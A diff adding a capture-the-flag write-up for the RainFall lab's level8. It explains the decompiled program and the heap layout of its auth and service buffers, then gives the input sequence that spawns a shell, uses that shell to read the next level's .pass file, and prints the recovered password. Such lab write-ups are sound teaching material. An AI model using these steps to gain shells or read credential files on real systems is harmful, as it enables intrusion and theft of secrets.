@@ -1,0 +1,106 @@
+As usual we use scp and Ghidra to decompilate the program.
+scp -r  -P 4242 level8@192.168.56.102:/home/user/level8 .
+
+
+This time we have a program that is a bit more complex than the previous ones,
+this is very hard to read, so we used chatGPT to generate a summary of the program.
+Thank youuu openAi <3, we have something readable now.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void) {
+	char buffer[128];
+	char* auth = NULL;
+	char* service = NULL;
+	
+	while (1) {
+		printf("%p, %p\n", auth, service);
+		if (fgets(buffer, sizeof(buffer), stdin) == NULL)
+			break;
+		
+		if (strncmp(buffer, "auth ", 5) == 0) {
+			auth = malloc(4);
+			*auth = 0;
+			if (strlen(buffer + 5) <= 30)
+				strcpy(auth, buffer + 5);
+		}
+		
+		if (strncmp(buffer, "reset", 5) == 0)
+			free(auth);
+		
+		if (strncmp(buffer, "service", 6) == 0)
+			service = strdup(buffer + 7);
+		
+		if (strncmp(buffer, "login", 5) == 0) {
+			if (auth[32] != 0)
+				system("/bin/sh");
+			else
+				fwrite("Password:\n", 1, 10, stdout);
+		}
+	}
+	
+	return 0;
+}
+
+So we have an infinite loop, and we can see that the program is using fgets to get our input, and put it in buffer.
+Then it checks if the first 5 characters of buffer are "auth ", if it is the case, it will allocate 4 bytes of memory for auth, and then copy the content of buffer + 5 into auth.
+If the first 5 characters of buffer are "reset", it will free auth.
+If the first 6 characters of buffer are "service", it will allocate memory for service, and then copy the content of buffer + 7 into service.
+If the first 5 characters of buffer are "login", it will check if the 33rd character of auth is not 0, if it is the case, it will execute /bin/sh, else it will print "Password:\n".
+
+So we have to find a way to go in the if statement that will execute /bin/sh.
+
+This line : auth = malloc(4);
+Allocates 4 bytes of memory = 32 bits.
+
+First we are going to test something, we are going to enter "auth "
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+auth  
+0x804a008, (nil) 
+
+We can see that auth is allocated at 0x804a008.
+Now we want to know the address of service.
+service aaa
+0x804a008, 0x804a018 
+
+We can see that service is allocated at 0x804a018.
+We are using the heap so memory location are allocated contiguously.
+We use python to calculate the offset between auth and service.
+>>> 0x804a008 - 0x804a018 
+-16
+>>> 
+
+So we have an offset of 16 bytes between auth and service.
+
+We have something like this :
+service        auth
+       <------>
+		  16
+
+
+So we have to write
+
+      7              15
+      |              |
+service aaaaaaaaaaaaaaa
+       <-------------->
+			  16
+
+We start after the e of service because of this line : service = strdup(buffer + 7);
+We strdup the content of buffer + 7.
+
+
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service aaaaaaaaaaaaaaa			--->	(We can write more a if we want, but not less)
+0x804a008, 0x804a018 
+login							--->	(We try to login, auth[32] != 0 so we execute /bin/sh)
+$ whoami						--->	(We check if we are level9, to have the rights to cat)
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
